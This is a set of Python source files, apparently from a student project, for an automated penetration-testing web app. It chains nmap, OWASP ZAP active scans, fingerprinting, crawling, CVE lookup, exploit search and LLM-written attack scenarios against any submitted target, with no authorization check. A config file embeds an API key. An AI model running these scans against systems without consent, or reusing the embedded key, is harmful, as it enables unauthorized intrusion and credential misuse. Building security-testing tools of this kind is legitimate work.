        endpoints = web_info.get('apiendpoints', [])
        verifier = VulnerabilityVerifier(
            target, endpoints, all_cves, technologies_with_cpe
        )
        if hasattr(verifier, 'verify_vulnerabilities'):
            try:
                verifications = verifier.verify_vulnerabilities()
            except TypeError:
                verifications = verifier.verify_vulnerabilities(all_cves, web_info)
        elif hasattr(verifier, 'verify'):
            verifications = verifier.verify()
    except Exception:
        pass

    # ========== Step 8: 익스플로잇 ==========
    print(f"WORKFLOW: Step 8 - Searching for exploits...")
    exploits = []
    try:
        exploits = search_exploits_for_cves(all_cves)
        print(f"WORKFLOW: Found {len(exploits)} exploits")
    except Exception:
        pass

    # ========== Step 9: AI 시나리오 (객체 호환성 강화) ==========
    print(f"WORKFLOW: Step 9 - Generating AI-powered attack scenario...")
    scenario_text = ""
    scenario_object = {} # 프론트엔드를 위한 객체 형태
    
    try:
        prompt_lines = [f"Analyze the security posture of {target}."]
        
        if technologies_with_cpe:
            tech_names = [t.get('product', 'unknown') for t in technologies_with_cpe]
            prompt_lines.append(f"\nDetected Technologies: {', '.join(set(tech_names))}")
            
        if all_cves:
            prompt_lines.append(f"\nCritical Vulnerabilities ({len(all_cves)} found):")
            sorted_cves = sorted(all_cves, key=lambda x: float(x.get('cvss', 0) or 0), reverse=True)
            for cve in sorted_cves[:5]:
                cve_id = cve.get('id', 'Unknown')
                desc = cve.get('description', '')[:100].replace('\n', ' ')
                prompt_lines.append(f"- {cve_id}: {desc}...")

        prompt_lines.append("\nBased on this, create a short penetration testing scenario.")
        final_prompt = "\n".join(prompt_lines)
        
        print("WORKFLOW: Calling Ollama API...")
        try:
            scenario_text = call_ollama(final_prompt)
        except Exception:
            # Ollama 호출 실패 시 기본 텍스트 제공 (프로그램 죽지 않게)
            scenario_text = f"**Attack Scenario for {target}**\n\n"
            scenario_text += f"1. **Reconnaissance**: Discovered {len(technologies_with_cpe)} technologies.\n"
            scenario_text += f"2. **Vulnerability Analysis**: Identified {len(all_cves)} potential vulnerabilities.\n"
            scenario_text += f"3. **Exploitation**: Found {len(exploits)} public exploits.\n\n"
            scenario_text += "*(Note: AI generation service is currently unavailable, this is a generated summary)*"

        # ⭐ 중요: 프론트엔드가 객체를 원할 경우를 대비해 구조화된 데이터도 준비
        scenario_object = {
            "title": f"Penetration Test Scenario for {target}",
            "summary": scenario_text[:200] + "...",
            "content": scenario_text,
            "steps": [
                {"step": 1, "name": "Reconnaissance", "details": f"Found {len(technologies_with_cpe)} tech stacks"},
                {"step": 2, "name": "Scanning", "details": f"Detected {len(all_cves)} CVEs"},
                {"step": 3, "name": "Analysis", "details": "High risk vulnerabilities identified"}
            ]
        }
            
        print("WORKFLOW: AI scenario generated successfully")
            
    except Exception as e:
        logger.warning(f"AI generation failed: {e}")
        scenario_text = "AI scenario generation failed."
        scenario_object = {"content": scenario_text}

    logger.info("="*70)
    print("="*70)
    print("WORKFLOW: SCAN COMPLETED")
    
    recon_by_category = {"web": [], "network": [], "os": [], "database": [], "cloud": [], "container": []}
    cves_by_category = {"web": [], "network": [], "os": [], "database": [], "cloud": [], "container": []}
    
    for tech in technologies_with_cpe:
        recon_by_category["web"].append(tech)
    for cve in all_cves:
        cves_by_category["web"].append(cve)

    return {
        "target": target,
        "technologies": technologies_with_cpe,
        "cves": all_cves,
        "zap_alerts": zap_alerts,
        "verifications": verifications,
        "exploits": exploits,
        
        # ⭐ 핵심 수정: 단순 텍스트와 객체 모두 제공 (프론트엔드가 골라 쓸 수 있게) ⭐
        "scenario": scenario_text,          # 1. 예전 방식 (문자열)
        "ai_scenario": scenario_object,     # 2. 새로운 방식 (객체)
        "report_summary": scenario_text,    # 3. 비상용
        
        "recon": {
            "nmap": recon_result,
            "web": web_info,
            "os": {},
            "cloud": cloud_info,
            "by_category": recon_by_category
        },
        "cves_by_category": cves_by_category
    }


@bp.route("/api/cache/stats", methods=["GET"])
def api_cache_stats():
    """캐시 통계 조회"""
    stats = get_cache_manager().get_stats()
    return jsonify(stats)

@bp.route("/api/cache/clear", methods=["POST"])
def api_cache_clear():
    """캐시 초기화"""
    data = request.get_json() or {}
    clear_type = data.get("type", "expired")  # "expired", "all"
    
    cache_mgr = get_cache_manager()
    
    if clear_type == "all":
        cache_mgr.clear_all()
        return jsonify({"message": "All cache cleared"})
    else:
        deleted = cache_mgr.clear_expired()
        return jsonify({"message": f"{deleted} expired entries cleared"})

@bp.route('/api/scan/network', methods=['POST'])
def scan_network():
    """
    네트워크 스캔 API
    
    Request Body:
        network_cidr: "192.168.1.0/24"
        max_concurrent: 5
    """
    data = request.get_json()
    network_cidr = data.get('network_cidr')
    max_concurrent = data.get('max_concurrent', 5)
    
    if not network_cidr:
        return jsonify({"error": "network_cidr is required"}), 400
    
    try:
        # 지연 import로 함수 가져오기
        run_network_scan = get_run_network_scan()
        
        result = run_network_scan(network_cidr, max_concurrent)
        return jsonify(result), 200
    except Exception as e:
        logger.exception(f"Network scan failed: {e}")
        return jsonify({"error": str(e)}), 500


@bp.route('/api/zap_scan', methods=['POST'])
def api_zap_scan():
    """
    OWASP ZAP 스캔 실행 API
    
    Request Body:
        {
            "target": "http://localhost:3000",
            "run_spider": true,
            "run_active": true,
            "risk_levels": ["High", "Medium"],
            "zap_api_key": "change-me-9203935709",
            "zap_host": "127.0.0.1",
            "zap_port": 8080
        }
    
    Response:
        {
            "status": "success",
            "target": "http://localhost:3000",
            "spider_result": {...},
            "active_scan_result": {...},
            "alerts": [...],
            "summary": {
                "total_alerts": 15,
                "high": 3,
                "medium": 8,
                "low": 4
            }
        }
    """
    try:
        data = request.get_json() or {}
        target = data.get('target')
        
        if not target:
            return jsonify({'error': 'target URL is required'}), 400
        
        # ZAP 설정
        zap_api_key = data.get('zap_api_key', 'change-me-9203935709')
        zap_host = data.get('zap_host', '127.0.0.1')
        zap_port = data.get('zap_port', 8080)
        
        # 스캔 옵션
        run_spider = data.get('run_spider', True)
        run_active = data.get('run_active', True)
        risk_levels = data.get('risk_levels', ['High', 'Medium'])
        
        logger.info(f"ZAP Scan requested for target: {target}")
        
        # ZAP Scanner 초기화
        from ..core.scanner.zap_scanner import ZapScanner
        
        scanner = ZapScanner(
            api_key=zap_api_key,
            proxy_host=zap_host,
            proxy_port=zap_port,
            timeout=600  # 10분
        )
        
        # 전체 스캔 실행
        result = scanner.full_scan(
            target_url=target,
            run_spider=run_spider,
            run_active=run_active,
            risk_levels=risk_levels
        )
        
        if 'error' in result:
            return jsonify({
                'status': 'error',
                'message': result['error'],
                'result': result
            }), 500
        
        return jsonify({
            'status': 'success',
            'result': result
        })
        
    except Exception as e:
        logger.exception(f"ZAP scan failed: {e}")
        return jsonify({'error': str(e)}), 500


@bp.route('/api/zap_alerts', methods=['GET'])
def api_zap_alerts():
    """
    ZAP Alert 조회 API (스캔 후 별도 조회)
    
    Query Parameters:
        ?base_url=http://localhost:3000&risk_levels=High,Medium
    
    Response:
        {
            "alerts": [...],
            "total": 15,
            "by_risk": {...}
        }
    """
    try:
        base_url = request.args.get('base_url')
        risk_levels_str = request.args.get('risk_levels', 'High,Medium')
        risk_levels = [r.strip() for r in risk_levels_str.split(',')]
        
        from ..core.scanner.zap_scanner import ZapScanner, format_alerts_for_dashboard
        
        scanner = ZapScanner()
        alerts = scanner.get_alerts(base_url=base_url, risk_levels=risk_levels)
        
        formatted = format_alerts_for_dashboard(alerts)
        
        return jsonify({
            'status': 'success',
            'alerts': alerts,
            'formatted': formatted
        })
        
    except Exception as e:
        logger.exception(f"Failed to fetch ZAP alerts: {e}")
        return jsonify({'error': str(e)}), 500

# ==========================================
# Deep Fingerprinting Trace API
# ==========================================

@bp.route('/api/deep-fingerprint', methods=['POST'])
def api_deep_fingerprint():
    """
    Deep Fingerprinting Trace API
    레이어별로 순차적으로 기술을 탐지하고 각 단계의 결과를 반환
    """
    data = request.get_json() or {}
    target = data.get('target')

    if not target:
        return jsonify({'error': 'target is required'}), 400

    try:
        result = {
            'target': target,
            'timestamp': time.time(),
            'layers': []
        }

        # ===================================
        # Layer 1: HTTP Header Analysis
        # ===================================
        layer1_start = time.time()
        logger.info(f"[DEEP-FP] Layer 1: HTTP Header Analysis started for {target}")

        try:
            # analyze_http_headers 함수 사용 (소문자!)
            from ..core.recon.web import analyze_http_headers
            header_analysis = analyze_http_headers(target)

            layer1_techs = []
            if header_analysis:
                # Server 헤더 정보
                if 'webserver' in header_analysis and header_analysis['webserver']:
                    layer1_techs.append({
                        'name': header_analysis['webserver'],
                        'confidence': 0.7,
                        'source': 'Server Header',
                        'method': 'HTTP Response Header'
                    })

                # X-Powered-By 정보
                if 'webframework' in header_analysis and header_analysis['webframework']:
                    layer1_techs.append({
                        'name': header_analysis['webframework'],
                        'confidence': 0.8,
                        'source': 'X-Powered-By Header',
                        'method': 'HTTP Response Header'
                    })

                # Programming Language
                if 'programminglanguage' in header_analysis and header_analysis['programminglanguage']:
                    layer1_techs.append({
                        'name': header_analysis['programminglanguage'],
                        'confidence': 0.75,
                        'source': 'X-Powered-By Analysis',
                        'method': 'HTTP Response Header'
                    })

            layer1_duration = time.time() - layer1_start

            result['layers'].append({
                'id': 1,
                'name': 'HTTP Header Analysis',
                'description': 'Basic technology detection from HTTP response headers',
                'duration': round(layer1_duration, 2),
                'technologies': layer1_techs,
                'count': len(layer1_techs),
                'status': 'completed'
            })

            logger.info(f"[DEEP-FP] Layer 1 completed: {len(layer1_techs)} technologies found")

        except Exception as e:
            logger.error(f"[DEEP-FP] Layer 1 failed: {e}")
            result['layers'].append({
                'id': 1,
                'name': 'HTTP Header Analysis',
                'duration': 0,
                'technologies': [],
                'count': 0,
                'status': 'failed',
                'error': str(e)
            })

        # ===================================
        # Layer 2: File Structure & Path Analysis
        # ===================================
        layer2_start = time.time()
        logger.info(f"[DEEP-FP] Layer 2: File Structure Analysis started")

        try:
            from ..core.recon.web import discover_endpoints_with_ffuf, extract_version_from_endpoints

            # 중요 경로 탐색
            endpoints = discover_endpoints_with_ffuf(target)

            # 버전 정보 추출
            layer2_techs = extract_version_from_endpoints(target, endpoints)

            # 형식 통일
            layer2_formatted = []
            for tech in layer2_techs:
                layer2_formatted.append({
                    'name': tech.get('name', 'Unknown'),
                    'version': tech.get('version', ''),
                    'confidence': 0.85,
                    'source': tech.get('source', 'File Structure'),
                    'method': 'Path Enumeration & File Analysis'
                })

            layer2_duration = time.time() - layer2_start

            result['layers'].append({
                'id': 2,
                'name': 'File Structure & Path Analysis',
                'description': 'Deep analysis of file paths, package.json, version endpoints',
                'duration': round(layer2_duration, 2),
                'technologies': layer2_formatted,
                'endpoints_discovered': len(endpoints),
                'count': len(layer2_formatted),
                'status': 'completed'
            })

            logger.info(f"[DEEP-FP] Layer 2 completed: {len(layer2_formatted)} technologies found")

        except Exception as e:
            logger.error(f"[DEEP-FP] Layer 2 failed: {e}")
            result['layers'].append({
                'id': 2,
                'name': 'File Structure & Path Analysis',
                'duration': 0,
                'technologies': [],
                'count': 0,
                'status': 'failed',
                'error': str(e)
            })

        # ===================================
        # Layer 3: Deep Verification
        # ===================================
        layer3_start = time.time()
        logger.info(f"[DEEP-FP] Layer 3: Deep Verification started")

        try:
            # 모든 기술 정보 수집
            all_techs = []
            for layer in result['layers']:
                if layer['status'] == 'completed':
                    all_techs.extend(layer['technologies'])

            # VulnerabilityVerifier를 사용한 검증
            verifier = VulnerabilityVerifier(
                target_url=target,
                endpoints=[],
                cves=[],
                technologies=all_techs
            )

            # 서버 컨텍스트 탐지
            server_context = verifier.detectServerContext()

            layer3_techs = []

            # 검증된 OS 정보
            if server_context.get('os') != 'unknown':
                layer3_techs.append({
                    'name': server_context['os'].upper(),
                    'category': 'Operating System',
                    'confidence': 0.95,
                    'source': 'Context-Aware Detection',
                    'method': 'Multi-Source Verification',
                    'verified': True
                })

            # 검증된 웹서버 정보
            if server_context.get('webserver') != 'unknown':
                layer3_techs.append({
                    'name': server_context['webserver'].capitalize(),
                    'category': 'Web Server',
                    'confidence': 0.95,
                    'source': 'Context-Aware Detection',
                    'method': 'Multi-Source Verification',
                    'verified': True
                })

            # 검증된 언어 정보
            if server_context.get('language') != 'unknown':
                layer3_techs.append({
                    'name': server_context['language'].upper(),
                    'category': 'Programming Language',
                    'confidence': 0.95,
                    'source': 'Context-Aware Detection',
                    'method': 'Multi-Source Verification',
                    'verified': True
                })

            layer3_duration = time.time() - layer3_start

            result['layers'].append({
                'id': 3,
                'name': 'Deep Verification',
                'description': 'Context-aware verification using AdvancedVerification engine',
                'duration': round(layer3_duration, 2),
                'technologies': layer3_techs,
                'count': len(layer3_techs),
                'server_context': server_context,
                'status': 'completed'
            })

            logger.info(f"[DEEP-FP] Layer 3 completed: {len(layer3_techs)} verified technologies")

        except Exception as e:
            logger.error(f"[DEEP-FP] Layer 3 failed: {e}")
            result['layers'].append({
                'id': 3,
                'name': 'Deep Verification',
                'duration': 0,
                'technologies': [],
                'count': 0,
                'status': 'failed',
                'error': str(e)
            })

        # ===================================
        # Summary
        # ===================================
        total_duration = time.time() - result['timestamp']
        total_techs = sum(layer['count'] for layer in result['layers'] if layer['status'] == 'completed')

        result['summary'] = {
            'total_duration': round(total_duration, 2),
            'total_technologies': total_techs,
            'layers_completed': sum(1 for layer in result['layers'] if layer['status'] == 'completed'),
            'layers_failed': sum(1 for layer in result['layers'] if layer['status'] == 'failed')
        }

        logger.info(f"[DEEP-FP] Scan completed: {total_techs} technologies in {total_duration:.2f}s")

        return jsonify(result)

    except Exception as e:
        logger.exception(f"[DEEP-FP] Scan failed: {e}")
        return jsonify({'error': str(e)}), 500


# ============================================================================
# URL Tree Mapping API - Hierarchical Structure Visualization
# ============================================================================

@bp.route('/api/url-tree', methods=['POST'])
def url_tree():
    """
    URL Tree Mapping - 계층적 URL 구조 시각화
    
    Features:
    1. Recursive web crawling
    2. Smart directory discovery
    3. Hierarchical tree building
    4. Vulnerability mapping to nodes
    
    Request body:
        {
            "target": "http://example.com",
            "max_depth": 3,
            "max_urls": 500,
            "enable_crawler": true,
            "enable_discovery": true
        }
    
    Returns:
        {
            "tree": {...},
            "statistics": {...},
            "duration": 12.34
        }
    """
    try:
        data = request.get_json()
        target = data.get('target')
        
        if not target:
            return jsonify({'error': 'Target URL required'}), 400
        
        logger.info(f"[URL-TREE] Starting URL tree mapping for {target}")
        
        # Configuration
        max_depth = data.get('max_depth', 3)
        max_urls = data.get('max_urls', 500)
        enable_crawler = data.get('enable_crawler', True)
        enable_discovery = data.get('enable_discovery', True)
        
        start_time = time.time()
        
        all_urls = []
        
        # ===================================
        # Phase 1: Web Crawling
        # ===================================
        if enable_crawler:
            logger.info(f"[URL-TREE] Phase 1: Crawling (depth: {max_depth}, max: {max_urls})")
            
            try:
                from ..core.recon.crawler import crawl_target
                
                crawler_result = crawl_target(
                    target_url=target,
                    max_depth=max_depth,
                    max_urls=max_urls
                )
                
                all_urls.extend(crawler_result['urls'])
                
                logger.info(f"[URL-TREE] Crawler found {len(crawler_result['urls'])} URLs, "
                           f"{len(crawler_result['api_endpoints'])} API endpoints")
                
            except Exception as e:
                logger.error(f"[URL-TREE] Crawler failed: {e}")
        
        # ===================================
        # Phase 2: Smart Discovery
        # ===================================
        if enable_discovery:
            logger.info(f"[URL-TREE] Phase 2: Smart directory discovery")
            
            try:
                from ..core.recon.discovery import discover_endpoints
                
                discovery_result = discover_endpoints(
                    target_url=target,
                    max_depth=max_depth,
                    threads=10
                )
                
                all_urls.extend(discovery_result['endpoints'])
                
                logger.info(f"[URL-TREE] Discovery found {len(discovery_result['endpoints'])} endpoints")
                
            except Exception as e:
                logger.error(f"[URL-TREE] Discovery failed: {e}")
        
        # ===================================
        # Phase 3: Get CVE & Tech data
        # ===================================
        logger.info(f"[URL-TREE] Phase 3: Fetching vulnerability and technology data")
        
        cves = []
        technologies = []
        
        try:
            # Deep Fingerprinting으로 기술 탐지
            from ..core.recon.fingerprint import deep_fingerprint
            
            fp_result = deep_fingerprint(target)
            
            # 모든 레이어에서 기술 수집
            for layer in fp_result.get('layers', []):
                technologies.extend(layer.get('technologies', []))
            
            logger.info(f"[URL-TREE] Collected {len(technologies)} technologies")
            
        except Exception as e:
            logger.warning(f"[URL-TREE] Could not fetch fingerprint data: {e}")
        
        # TODO: CVE 데이터도 가져오기 (기존 스캔 결과 활용)
        
        # ===================================
        # Phase 4: Build Tree Structure
        # ===================================
        logger.info(f"[URL-TREE] Phase 4: Building hierarchical tree")
        
        try:
            from ..core.recon.mapper import build_url_tree
            
            tree_result = build_url_tree(
                urls=all_urls,
                base_url=target,
                cves=cves if cves else None,
                technologies=technologies if technologies else None
            )
            
            duration = time.time() - start_time
            
            logger.info(f"[URL-TREE] Tree built successfully in {duration:.2f}s")
            logger.info(f"[URL-TREE] Statistics: {tree_result['statistics']}")
            
            # Add metadata
            result = {
                'success': True,
                'target': target,
                'tree': tree_result['tree'],
                'statistics': tree_result['statistics'],
                'total_urls': len(all_urls),
                'duration': round(duration, 2),
                'config': {
                    'max_depth': max_depth,
                    'max_urls': max_urls,
                    'crawler_enabled': enable_crawler,
                    'discovery_enabled': enable_discovery
                }
            }
            
            return jsonify(result)
            
        except Exception as e:
            logger.exception(f"[URL-TREE] Tree building failed: {e}")
            return jsonify({'error': f'Tree building failed: {str(e)}'}), 500
        
    except Exception as e:
        logger.exception(f"[URL-TREE] Request failed: {e}")
        return jsonify({'error': str(e)}), 500

@bp.route('/url-tree')
def url_tree_page():
    """URL Tree 시각화 페이지"""
    return render_template('url_tree.html')

@bp.route('/live-scan')
def live_scan_page():
    """실시간 스캔 대시보드 페이지"""
    return render_template('live_scan.html')
```
---

## File 5: websocket.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\api\websocket.py`

```python
from flask_socketio import emit
from flask import request
from app.models import ScanResult, Project
from app import db, create_app
import traceback
import requests
import re
import time
from app.services.intelligence import IntelligenceEngine

class ScanProgressEmitter:
    def __init__(self, socketio):
        self.socketio = socketio

    def emit_log(self, msg, stage='info', progress=0):
        self.socketio.emit('scan_progress', {'stage': stage, 'progress': progress, 'current_item': msg})

    def emit_tech(self, name, version=None, source="Recon", evidence="", confidence="High"):
        """
        기술 탐지 정보 전송 (Evidence 필드 포함)
        """
        self.socketio.emit('technology_detected', {
            'name': name, 
            'version': version or 'N/A', 
            'source': source,
            'evidence': evidence,
            'confidence': confidence
        })

    def emit_url(self, url, status_code=None):
        self.socketio.emit('url_discovered', {'url': url, 'status_code': status_code})

def register_socketio_handlers(socketio, scan_emitter):
    @socketio.on('start_scan')
    def handle_start_scan(data):
        target = data.get('target')
        project = Project.query.filter_by(target=target).first()
        socketio.start_background_task(run_integrated_scan, target, project.id if project else None, scan_emitter)

def run_integrated_scan(target, project_id, emitter):
    scan_data = {'technologies': [], 'urls': []}
    
    # 인텔리전스 엔진 초기화
    intelligence_engine = IntelligenceEngine()
    
    try:
        emitter.emit_log(f"🕵️ 통합 정찰 분석 개시: {target}", 'init', 5)
        
        # 1. L4 레이어: Nmap 기본 정찰
        from app.nmap_recon import run_recon
        clean_host = re.sub(r'^https?://', '', target).split('/')[0].split(':')[0]
        emitter.emit_log("📡 [L4] 포트 스캔 및 서비스 배너 수집 중...", 'recon', 15)
        
        nmap_res = run_recon(clean_host)
        if nmap_res:
            for host in nmap_res:
                for port in host.get('ports', []):
                    if port.get('product'):
                        name = port['product']
                        version = port.get('version', '')
                        # 인텔리전스 엔진에 Nmap 결과 추가
                        intelligence_engine.add_finding(
                            tech_name=name,
                            version=version,
                            category="Service",
                            source_tool="Nmap",
                            evidence=f"Port {port['port']}/{port['protocol']} open banner"
                        )

        # 2. 강력한 통합 엔진(collect_web_info) 호출
        from app.core.recon.web import collect_web_info
        emitter.emit_log("🚀 [Deep Recon] 16개 기술 탐지 엔진 가동 중...", 'recon', 40)
        
        # 웹 스캔 수행
        web_info = collect_web_info(target)
        
        # 3. 데이터 정제 및 검증 (Intelligence Engine)
        emitter.emit_log("🧠 [AI Analysis] 수집된 데이터 교차 검증 및 정제 중...", 'analysis', 70)
        
        # web_info 통째로 엔진에 넘겨서 정제 (중복 제거, 버전 통합)
        refined_techs = intelligence_engine.refine_data(web_info, target)
        
        # 정제된 결과 전송 및 저장
        for tech in refined_techs:
            # 리스트로 된 근거(Evidence)를 보기 좋게 문자열로 결합
            evidence_str = " | ".join(tech['evidence'])
            source_str = ", ".join(tech['sources'])
            
            # 실시간 전송
            emitter.emit_tech(
                name=tech['name'], 
                version=tech['version'], 
                source=source_str, 
                evidence=evidence_str,
                confidence=tech['confidence']
            )
            
            # DB 저장용 데이터 구성
            scan_data['technologies'].append({
                'name': tech['name'],
                'version': tech['version'],
                'source': source_str,
                'evidence': evidence_str,
                'confidence': tech['confidence']
            })

        # 4. 크롤링 및 구조 분석
        from app.core.recon.crawler import WebCrawler
        emitter.emit_log("🕸️ [Structure] 사이트 내부 경로 수집 중...", 'crawling', 85)
        crawler = WebCrawler(target, max_depth=1)
        crawl_res = crawler.crawl()
        for u in crawl_res.get('urls', []):
            url_str = u['url'] if isinstance(u, dict) else u
            scan_data['urls'].append(url_str)
            emitter.emit_url(url_str, 200)

        # 5. 결과 저장
        if project_id:
            app, _ = create_app()
            with app.app_context():
                db.session.add(ScanResult(project_id=project_id, data=scan_data))
                db.session.commit()

        emitter.emit_log(f"✅ 분석 완료: 총 {len(refined_techs)}개 기술 스택 식별됨", 'completed', 100)
        emitter.socketio.emit('scan_completed', {})

    except Exception as e:
        traceback.print_exc()
        emitter.emit_log(f"❌ 오류 발생: {str(e)}", 'error')
```
---

## File 6: config.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\config.py`

```python
# app/config.py

class Config:
    # cve-search api
    CVE_SEARCH_BASE_URL = "https://localhost"

    # ollama
    OLLAMA_BASE_URL = "http://localhost:11434"
    OLLAMA_MODEL = "gemma3:4b"

    # nmap 등 옵션
    # 🆕 HTTP 헤더 감지 추가
    NMAP_ARGS = "-sV -sT -Pn --script=http-headers,http-server-header"

    # 데모 시 보안 관련 옵션(예: 실제 IP 마스킹)
    MASK_REAL_IP = True

    # NVD 관련 설정
    NVD_API_KEY = "fe4669a1-c66f-4058-bc9e-5440b5919e2f"
    NVD_BASE_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    NVD_RESULTS_PER_PAGE = 50
    REQUEST_TIMEOUT = 15

    # ZAP Docker 설정
    ZAP_API_KEY = '12345'
    ZAP_PROXY_HOST = '127.0.0.1'
    ZAP_PROXY_PORT = 8080
    ZAP_TIMEOUT = 600  # 10분
    ZAP_DEFAULT_RISK_LEVELS = ['High', 'Medium']
```
---

## File 7: __init__.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\__init__.py`

```python
# Core modules for penetration testing automation

```
---

## File 8: __init__.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\cve\__init__.py`

```python
# CVE related modules

```
---

## File 9: async_nvd_client.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\cve\async_nvd_client.py`

```python
# app/core/cve/async_nvd_client.py

"""
NVD API v2.0 비동기 클라이언트 (최적화 버전)
- Rate limiting 강화
- CPE 기반 검색
- 403 에러 방지
"""

import asyncio
import aiohttp
import time
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import quote

logger = logging.getLogger(__name__)


class AsyncNvdClient:
    """비동기 NVD API 클라이언트"""
    
    def __init__(
        self,
        api_key: Optional[str] = None,
        base_url: str = "https://services.nvd.nist.gov/rest/json/cves/2.0",
        results_per_page: int = 50,
        request_timeout: int = 15,
        rate_limit_delay: float = 0.6,
        use_local_cve_search: bool = True  # 로컬 DB 사용 여부
    ):
        self.api_key = api_key
        self.base_url = base_url
        self.results_per_page = results_per_page
        self.request_timeout = request_timeout
        self.rate_limit_delay = rate_limit_delay
        self.use_local_cve_search = use_local_cve_search
        
        # 통계
        self.stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "cache_hits": 0,
            "api_errors": 0,
            "rate_limit_errors": 0,
            "total_cves_found": 0
        }
        
        self._last_request_time = 0
    
    
    async def _wait_for_rate_limit(self):
        """Rate limiting: API 호출 간격 제어"""
        current_time = time.time()
        elapsed = current_time - self._last_request_time
        
        if elapsed < self.rate_limit_delay:
            wait_time = self.rate_limit_delay - elapsed
            logger.debug(f"[NVD] Rate limiting: waiting {wait_time:.2f}s")
            await asyncio.sleep(wait_time)
        
        self._last_request_time = time.time()
    
    async def search_cves_by_cpe_local(
        self,
        cpe: str,
        base_url: str = "https://localhost:443"
    ) -> List[Dict[str, Any]]:
        """
        로컬 cve-search Docker에서 CVE 검색
        """
        # 🔥 올바른 엔드포인트: /api/cvefor/{cpe}
        from urllib.parse import quote
        cpe_encoded = quote(cpe, safe='')
        url = f"{base_url}/api/cvefor/{cpe_encoded}"
        
        logger.info(f"[CVE-SEARCH] Querying: {url}")
        
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as response:
                    self.stats["total_requests"] += 1
                    
                    if response.status == 200:
                        self.stats["successful_requests"] += 1
                        data = await response.json()
                        
                        # 응답 처리
                        if isinstance(data, list):
                            logger.info(f"[CVE-SEARCH] ✅ Found {len(data)} CVEs for {cpe}")
                            return data
                        elif isinstance(data, dict) and "id" in data:
                            logger.info(f"[CVE-SEARCH] ✅ Found 1 CVE for {cpe}")
                            return [data]
                        else:
                            logger.warning(f"[CVE-SEARCH] Unexpected response format")
                            return []
                    
                    elif response.status == 404:
                        logger.info(f"[CVE-SEARCH] No CVEs found for {cpe}")
                        return []
                    
                    else:
                        self.stats["failed_requests"] += 1
                        logger.warning(f"[CVE-SEARCH] HTTP {response.status}")
                        return []
                        
        except Exception as e:
            self.stats["api_errors"] += 1
            logger.exception(f"[CVE-SEARCH] Error for {cpe}: {e}")
            return []

    
    async def search_cves_by_cpe(
        self,
        cpe: str,
        max_results: int = 100
    ) -> List[Dict[str, Any]]:
        """
        CPE 문자열로 CVE 검색 (로컬/원격 자동 선택)
        """
        # 로컬 DB 우선 사용
        if self.use_local_cve_search:
            logger.info(f"[NVD] Using local cve-search for: {cpe}")
            return await self.search_cves_by_cpe_local(cpe)
        
        # 기존 NVD API 사용
        logger.info(f"[NVD] Using NVD API for: {cpe}")
        await self._wait_for_rate_limit()
        
        params = {
            "cpeName": cpe,
            "resultsPerPage": self.results_per_page
        }
        
        headers = {}
        if self.api_key:
            headers["apiKey"] = self.api_key
        
        all_cves = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    self.base_url,
                    params=params,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=self.request_timeout)
                ) as response:
                    self.stats["total_requests"] += 1
                    
                    if response.status == 200:
                        self.stats["successful_requests"] += 1
                        data = await response.json()
                        vulnerabilities = data.get("vulnerabilities", [])
                        all_cves.extend(vulnerabilities)
                        logger.info(f"[NVD] Found {len(vulnerabilities)} CVEs for {cpe}")
                    
                    elif response.status == 404:
                        logger.warning(f"[NVD] CPE not found in database: {cpe}")
                    
                    elif response.status == 403:
                        self.stats["rate_limit_errors"] += 1
                        logger.error(f"[NVD] 403 Forbidden - Rate limit exceeded")
                    
                    else:
                        self.stats["failed_requests"] += 1
                        logger.warning(f"[NVD] HTTP {response.status} for CPE: {cpe}")
        
        except asyncio.TimeoutError:
            self.stats["api_errors"] += 1
            logger.error(f"[NVD] Timeout for CPE: {cpe}")
        
        except Exception as e:
            self.stats["api_errors"] += 1
            logger.exception(f"[NVD] Exception for CPE {cpe}: {e}")
        
        self.stats["total_cves_found"] += len(all_cves)
        return all_cves[:max_results]
    
    
    async def search_cves_by_keyword(
        self,
        keyword: str,
        max_results: int = 50
    ) -> List[Dict[str, Any]]:
        """키워드로 CVE 검색"""
        logger.info(f"[NVD] Searching by keyword: {keyword}")
        await self._wait_for_rate_limit()
        
        params = {
            "keywordSearch": keyword,
            "resultsPerPage": self.results_per_page
        }
        
        headers = {}
        if self.api_key:
            headers["apiKey"] = self.api_key
        
        all_cves = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    self.base_url,
                    params=params,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=self.request_timeout)
                ) as response:
                    self.stats["total_requests"] += 1
                    
                    if response.status == 200:
                        self.stats["successful_requests"] += 1
                        data = await response.json()
                        vulnerabilities = data.get("vulnerabilities", [])
                        all_cves.extend(vulnerabilities)
                        logger.info(f"[NVD] Found {len(vulnerabilities)} CVEs for keyword: {keyword}")
                    
                    elif response.status == 403:
                        self.stats["rate_limit_errors"] += 1
                        logger.error(f"[NVD] 403 Forbidden")
                    
                    else:
                        self.stats["failed_requests"] += 1
                        logger.warning(f"[NVD] HTTP {response.status}")
        
        except asyncio.TimeoutError:
            self.stats["api_errors"] += 1
            logger.error(f"[NVD] Timeout")
        
        except Exception as e:
            self.stats["api_errors"] += 1
            logger.exception(f"[NVD] Exception: {e}")
        
        self.stats["total_cves_found"] += len(all_cves)
        return all_cves[:max_results]
    
    
    def get_stats(self) -> Dict[str, int]:
        """통계 정보 반환"""
        return self.stats.copy()
    
    
    def reset_stats(self):
        """통계 초기화"""
        for key in self.stats:
            self.stats[key] = 0
```
---

## File 10: cache_manager.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\cve\cache_manager.py`

```python
# app/core/cve/cache_manager.py
# 영구 캐시 매니저 (SQLite/Redis)

import json
import time
import logging
import sqlite3
from typing import Optional, Dict, Any
from pathlib import Path

logger = logging.getLogger(__name__)

class CacheManager:
    """
    CVE 캐시 매니저
    - 메모리 캐시 (1차: 빠름)
    - 영구 캐시 (2차: 재시작 후에도 유지)
    - TTL 지원
    """
    
